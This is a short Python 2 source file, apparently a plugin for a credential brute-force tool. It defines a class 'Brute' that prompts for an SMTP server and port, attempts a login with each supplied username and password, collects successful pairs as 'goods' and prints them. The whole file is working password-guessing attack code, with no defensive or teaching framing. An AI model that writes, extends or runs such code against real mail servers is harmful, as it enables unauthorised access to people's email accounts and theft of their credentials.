class Brute (object):
    def __init__ (self):
        self.serv = raw_input('SMTP Server: ')
        self.port = raw_input('Port: ')

    def run (self, **kwargs):
        from smtplib import SMTP
        from core import output

        if self.port is not None:
            s = SMTP(self.serv, self.port)
        else:
            s = SMTP(self.serv)

        s.starttls()

        try:
            s.login(kwargs['current_login'], kwargs['current_password'])
            st_good = 'Login: ' + kwargs['current_login'] + ' Password: ' + kwargs['current_password']
            kwargs['goods'].append(st_good)
            print output.YES + st_good
            s.quit()
            exit ()
        except:
            print output.NO + 'Password ' + kwargs['current_password'] + ' is not for ' + kwargs['current_login']

